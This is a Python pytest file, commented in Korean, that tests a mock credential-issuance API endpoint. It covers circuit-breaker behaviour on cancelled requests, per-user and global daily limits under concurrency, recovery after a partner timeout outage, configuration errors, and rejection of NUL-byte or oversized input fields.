    # DB에 접속하지 못한 요청(OperationalError)은 DB 혼잡과 같은 503 + Retry-After다 (main.py database_busy_handler).
    assert [issue(client, user).status_code for _ in range(3)] == [503] * 3
    assert fake_dx.issued == []
    assert mock_issue_attempts._attempts == {} and breaker._last_probe is None  # 탐침 기회도 그대로 남는다
    breaker.clear()
    assert [issue(client, user).status_code for _ in range(3)] == [503] * 3  # 보통 요청일 때도 같다
    assert mock_issue_attempts._attempts == {} and len(breaker._failures) == 0


async def test_cancelled_mock_issue_counts_as_a_failure_only_while_the_partner_is_asked(client, register, fake_dx,
                                                                                        monkeypatch, db, issue_breaker):
    # 요청이 끊겨도(취소) 차단기에 자리·탐침이 새지 않는다: 발급 기록을 예약하는 동안(협력사를 부르기 전) 끊기면 돌려주고,
    # 협력사의 답을 기다리는 동안 끊기면 결과를 모르므로 실패로 남긴다.
    from app.services.database import db_service
    from main import app

    breaker, _ = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="1")
    user = register()
    body, reserve = {"holderDid": user["did"]}, db_service.reserve_mock_issuance
    in_db, in_partner, release = threading.Event(), asyncio.Event(), threading.Event()

    def held_reservation(*args):
        in_db.set()
        release.wait(5)  # 테스트가 풀어 줄 때까지 (길어도 5초: 테스트가 멈추지 않는다)
        return None, "user"  # 끊긴 요청의 워커 스레드에 남은 예약: 결과는 쓰이지 않는다 (DB에는 아무것도 넣지 않는다)

    async def stuck(template_id, holder_did):
        in_partner.set()
        await asyncio.sleep(3600)

    async def cancelled_while(waiting_for) -> None:
        task = asyncio.ensure_future(ac.post("/api/mock-issuer/issue", json=body, headers=user["headers"]))
        await asyncio.wait_for(waiting_for(), timeout=5)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await asyncio.wait_for(task, timeout=5)

    async def reservation_started() -> None:
        while not in_db.is_set():
            await asyncio.sleep(0.01)

    monkeypatch.setattr(fake_dx, "issue_badge", stuck)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as ac:
        monkeypatch.setattr(db_service, "reserve_mock_issuance", held_reservation)
        await cancelled_while(reservation_started)
        assert len(breaker._failures) == 0 and breaker._last_probe is None  # 보통 요청: 자리를 돌려줬다
        release.set()
        monkeypatch.setattr(db_service, "reserve_mock_issuance", reserve)
        await cancelled_while(in_partner.wait)
        assert len(breaker._failures) == 1  # 협력사에 묻는 동안 끊긴 요청은 실패로 남는다 (한도 1: 창이 찼다)
        in_db.clear()
        release.clear()
        monkeypatch.setattr(db_service, "reserve_mock_issuance", held_reservation)
        await cancelled_while(reservation_started)
        assert len(breaker._failures) == 1 and breaker._last_probe is None  # 탐침: 탐침 기회를 돌려줬다
        release.set()


def test_mock_issue_global_daily_limit_bounds_all_users_together(client, register, fake_dx, monkeypatch, db):
    # 회귀: 한도가 사용자별뿐이라 계정을 여러 개 만들면(가입은 누구나) 그 수만큼 곱해 발급할 수 있었다.
    db.execute("DELETE FROM mock_issuances")  # 세션 DB의 다른 테스트 기록 (전체 한도는 모든 사용자를 합쳐 센다)
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="2", MOCK_ISSUER_GLOBAL_DAILY_LIMIT="3")
    alice, bob, carol = register(), register(), register()
    of_alice = [issue(client, alice) for _ in range(3)]
    assert [res.status_code for res in of_alice] == [200, 200, 429]  # 사용자별 한도
    of_bob = [issue(client, bob) for _ in range(2)]
    assert [res.status_code for res in of_bob] == [200, 429]  # 전체 한도 (bob은 1건뿐이다)
    # 사용자 자신의 한도와 전체 한도는 문구가 다르다 (FE가 '전체 한도' 안내를 따로 보여 준다).
    assert of_alice[-1].json() == {"detail": "Mock issuance limit reached; try again later"}
    assert of_bob[-1].json() == {"detail": "Mock issuance service limit reached; try again later."}
    limited = issue(client, carol)
    assert limited.status_code == 429
    assert limited.json() == {"detail": "Mock issuance service limit reached; try again later."}
    assert "retry-after" not in limited.headers
    assert len(fake_dx.issued) == 3 and issuance_rows(db, carol) == []
    # 둘 다 찬 사용자에게는 자신의 한도 문구로 답한다 (사용자별 한도를 먼저 본다).
    assert issue(client, alice).json() == {"detail": "Mock issuance limit reached; try again later"}
    # 24시간이 지난 기록은 세지 않는다.
    db.execute("UPDATE mock_issuances SET created_at = NOW() - INTERVAL '25 hours' WHERE user_id = %s", (bob["id"],))
    assert issue(client, carol).status_code == 200
    # 협력사가 실패로 답한 발급은 전체 한도에도 남지 않는다.
    db.execute("DELETE FROM mock_issuances WHERE user_id = %s", (carol["id"],))
    fake_dx.error = ProviderError("DXWorks 오류 (500): boom", upstream_status=500)
    assert issue(client, carol).status_code == 502
    fake_dx.error = None
    assert issue(client, carol).status_code == 200 and issue(client, bob).status_code == 429


def test_mock_issue_global_limit_holds_for_concurrent_users(client, register, fake_dx, monkeypatch, db):
    # 서로 다른 사용자 12명의 동시 요청, 전체 한도 4: 정확히 4건만 협력사로 가고 나머지는 429다 (500 없음).
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_GLOBAL_DAILY_LIMIT="4")
    users = [register() for _ in range(12)]
    issue_badge = fake_dx.issue_badge

    async def slow_issue(template_id, holder_did):
        await asyncio.sleep(0.05)  # 협력사 호출 중에 다른 요청들이 예약을 시도한다
        return await issue_badge(template_id, holder_did)

    monkeypatch.setattr(fake_dx, "issue_badge", slow_issue)
    with ThreadPoolExecutor(max_workers=12) as pool:
        statuses = sorted(pool.map(lambda user: issue(client, user).status_code, users))
    assert statuses == [200] * 4 + [429] * 8
    assert len(fake_dx.issued) == 4
    assert db.execute("SELECT count(*) AS n FROM mock_issuances").fetchone()["n"] == 4


def test_global_reservation_holds_when_different_users_reserve_at_the_same_instant(register, db):
    # 위 경로 수준 테스트는 프로세스 안의 차단기와 DB 자리가 요청을 충분히 줄 세워, 전체 잠금이 없어도 통과한다.
    # 여기서는 서로 다른 사용자 8명이 장벽에서 동시에 풀려 예약한다: 전체 잠금이 없으면 각자 같은 count를 보고 한도를 넘는다.
    from app.services.database import db_service

    users = [register() for _ in range(8)]
    for _ in range(10):
        db.execute("DELETE FROM mock_issuances")
        barrier = threading.Barrier(len(users))

        def reserve(user):
            barrier.wait(timeout=10)
            return db_service.reserve_mock_issuance(user["id"], "tpl-default", 10, 3)[1]

        with ThreadPoolExecutor(max_workers=len(users)) as pool:
            refused = list(pool.map(reserve, users))
        assert sorted(refused, key=str) == sorted([None] * 3 + ["global"] * 5, key=str)
        assert db.execute("SELECT count(*) AS n FROM mock_issuances").fetchone()["n"] == 3


def test_mock_issue_reservation_without_a_global_limit_counts_only_the_user(register, db):
    # reserve_mock_issuance의 전체 한도는 선택 인자다 (주지 않으면 사용자별 한도만 본다).
    from app.services.database import db_service

    db.execute("DELETE FROM mock_issuances")
    alice, bob = register(), register()
    issuance_id, refused_by = db_service.reserve_mock_issuance(alice["id"], "tpl-default", 1)
    assert issuance_id is not None and refused_by is None
    # 막은 한도를 함께 돌려준다: 사용자별 한도는 "user", 전체 한도는 "global".
    assert db_service.reserve_mock_issuance(alice["id"], "tpl-default", 1) == (None, "user")
    assert db_service.reserve_mock_issuance(bob["id"], "tpl-default", 1, 1) == (None, "global")  # 전체 1건이 이미 있다
    assert db_service.reserve_mock_issuance(alice["id"], "tpl-default", 1, 1) == (None, "user")  # 둘 다 찼으면 사용자별
    issuance_id, refused_by = db_service.reserve_mock_issuance(bob["id"], "tpl-default", 1, 2)
    assert issuance_id is not None and refused_by is None


def test_global_mock_issuance_limit_counts_unknown_outcomes_only_while_they_are_pending(register, db):
    # 전체 한도가 세는 것: 성공 기록(해시가 있는 행)은 24시간, 해시가 없는 행(진행 중인 요청, 결과를 모르는 실패)은 만든 뒤
    # 진행 중 창(MOCK_ISSUANCE_PENDING_SECONDS) 동안만. 사용자별 한도는 지금처럼 해시와 관계없이 24시간 동안 센다.
    from app.services.database import MOCK_ISSUANCE_PENDING_SECONDS, db_service

    # 진행 중 창은 발급 호출 하나의 가장 긴 시간(자리 대기·교환 각각 DXWORKS_TIMEOUT_SECONDS × 2, 설정 상한 120초)보다 길다.
    assert MOCK_ISSUANCE_PENDING_SECONDS >= 4 * 120 + 60
    db.execute("DELETE FROM mock_issuances")
    alice, bob = register(), register()
    pending, day = MOCK_ISSUANCE_PENDING_SECONDS, 24 * 60 * 60

    def add(user, age_seconds: float, token_sha256: str | None = None) -> None:
        db.execute("INSERT INTO mock_issuances (user_id, template_id, token_sha256, created_at)"
                   " VALUES (%s, 'tpl-default', %s, NOW() - make_interval(secs => %s))",
                   (user["id"], token_sha256, age_seconds))

    def age_all(age_seconds: float) -> None:
        db.execute("UPDATE mock_issuances SET created_at = NOW() - make_interval(secs => %s)", (age_seconds,))

    def refused_by(user, daily_limit: int = 10, global_limit: int = 2):
        issuance_id, refused = db_service.reserve_mock_issuance(user["id"], "tpl-default", daily_limit, global_limit)
        if issuance_id is not None:
            db_service.cancel_mock_issuance(issuance_id)  # 받아 주는지만 본다 (다음 확인에 남기지 않는다)
        return refused

    # 결과를 모르는 행: 진행 중 창 안이면 전체 한도에 세고, 창이 지나면 (24시간 안이어도) 세지 않는다.
    add(alice, pending - 30)
    add(alice, pending - 30)
    assert refused_by(bob) == "global"
    age_all(pending + 30)
    assert refused_by(bob) is None
    # 사용자별 한도는 결과를 모르는 행도 24시간 동안 센다 (그 사용자의 하루 발급 하나씩을 쓴다).
    assert refused_by(alice, daily_limit=2) == "user"
    age_all(day - 60)
    assert refused_by(alice, daily_limit=2) == "user"
    age_all(day + 60)
    assert refused_by(alice, daily_limit=2) is None
    # 성공 기록(해시가 있는 행)은 전체 한도에 24시간 동안 센다.
    db.execute("DELETE FROM mock_issuances")
    add(alice, day - 60, "a" * 64)
    add(alice, day - 60, "b" * 64)
    assert refused_by(bob) == "global"
    age_all(day + 60)
    assert refused_by(bob) is None
    # 섞여 있어도 같다: 한 시간 전의 성공 + 창 안의 결과를 모르는 행 = 2 (창 밖의 결과를 모르는 행은 세지 않는다).
    db.execute("DELETE FROM mock_issuances")
    add(alice, 3600, "c" * 64)
    add(alice, pending - 30)
    add(alice, pending + 30)
    assert refused_by(bob) == "global"


def test_mock_issue_reopens_after_a_time_out_outage_once_the_pending_window_has_passed(client, register, monkeypatch,
                                                                                      db, issue_breaker):
    # 회귀(XBE-1): 결과를 모르는 실패(응답 대기 중 시간 초과)로 남긴 예약을 DB 전체 한도가 24시간 동안 셌다. 협력사가 응답
    # 없이 시간 초과로 실패하는 동안 학생 40명이 5번씩 누르면 전체 한도(200)가 차서, 협력사가 돌아와도 24시간 동안 아무도
    # 발급하지 못했다 (차단기의 탐침도 DB 전체 한도에 막혀 협력사로 가지 못했다). 이제 전체 한도는 해시가 없는 예약을 진행 중
    # 창 동안만 센다: 창이 지나면 탐침이 나가 성공하고 모두가 다시 발급한다.
    from app.services.database import MOCK_ISSUANCE_PENDING_SECONDS

    breaker, clock = issue_breaker
    db.execute("DELETE FROM mock_issuances")
    use_settings(monkeypatch, MOCK_ISSUER_DAILY_LIMIT="5")
    partner = {"down": True}

    def handler(request):
        if partner["down"]:
            raise httpx.ReadTimeout("no answer")
        return httpx.Response(201, json={"data": {"id": "c1", "jwt": "a.b.c"}})

    sent = real_issuer(handler)
    students = [register() for _ in range(40)]
    statuses = [issue(client, student).status_code for _ in range(5) for student in students]  # 40명 × 5번
    assert statuses == [502] * 200 and len(sent) == 200
    assert db.execute("SELECT count(*) AS n FROM mock_issuances WHERE token_sha256 IS NULL").fetchone()["n"] == 200
    assert len(breaker._failures) == 200 and breaker._last_probe is None  # 차단기도 찼다: 다음 요청은 탐침 차례다
    partner["down"] = False
    newcomer = register()
    # 진행 중 창 안의 예약은 아직 센다: 탐침 차례의 요청도 DB 전체 한도에 막히고, 탐침 기회는 돌려준다.
    early = issue(client, newcomer)
    assert early.status_code == 429
    assert early.json() == {"detail": "Mock issuance service limit reached; try again later."}
    assert len(sent) == 200 and breaker._last_probe is None
    # 진행 중 창이 지났다 (예약은 아직 24시간 안이다).
    db.execute("UPDATE mock_issuances SET created_at = created_at - make_interval(secs => %s)",
               (MOCK_ISSUANCE_PENDING_SECONDS + 1,))
    clock["now"] += MOCK_ISSUANCE_PENDING_SECONDS + 1
    assert issue(client, newcomer).status_code == 200 and len(sent) == 201  # 탐침으로 나가 성공한다
    assert breaker._last_probe == clock["now"] and len(breaker._failures) == 0
    others = [register() for _ in range(10)]
    assert [issue(client, user).status_code for user in others] == [200] * 10 and len(sent) == 211
    # 결과를 모르는 실패는 그 학생의 하루 발급 수에는 계속 센다 (사용자별 한도는 24시간 동안 센다).
    assert issue(client, students[0]).json() == {"detail": "Mock issuance limit reached; try again later"}
    assert len(sent) == 211


def test_mock_issue_without_any_template_is_503_and_not_issued(client, register, fake_dx, monkeypatch, db, caplog):
    # 기본 템플릿 설정이 없으면 다른 설정 누락과 같은 503 고정 응답이고, 설정 이름은 운영 로그에만 남는다.
    use_settings(monkeypatch, DXWORKS_BADGE_TEMPLATE_ID="")
    user = register()
    with caplog.at_level(logging.WARNING):
        res = issue(client, user, templateId="  ")
    assert res.status_code == 503
    assert res.json() == {"detail": "Credential service is not configured", "code": "PROVIDER_NOT_CONFIGURED"}
    assert any(r.getMessage().startswith("Provider error:") and "DXWORKS_BADGE_TEMPLATE_ID" in r.getMessage()
               for r in caplog.records)
    assert fake_dx.issued == [] and issuance_rows(db, user) == []


def test_mock_issue_disabled_is_404_and_not_issued(client, register, fake_dx, monkeypatch, db):
    use_settings(monkeypatch, MOCK_ISSUER_ENABLED="false")
    user = register()
    res = issue(client, user)
    assert res.status_code == 404 and res.json() == {"detail": "Mock issuer is disabled"}
    assert fake_dx.issued == [] and issuance_rows(db, user) == []


@pytest.mark.parametrize("body", [
    {"templateId": "tpl-default\x00"},
    {"holderDid": "did:key:z6Mk\x00"},
    {"holderDid": "did:key:" + "z" * 248},  # 256자: users.subject_did VARCHAR(255)
], ids=["nul-template", "nul-holder", "long-holder"])
def test_mock_issue_rejects_unstorable_or_oversized_fields_with_422(client, register, fake_dx, db, body):
    user = register()
    res = client.post("/api/mock-issuer/issue", json={"holderDid": user["did"], **body}, headers=user["headers"])
    assert res.status_code == 422
    assert fake_dx.issued == [] and issuance_rows(db, user) == []
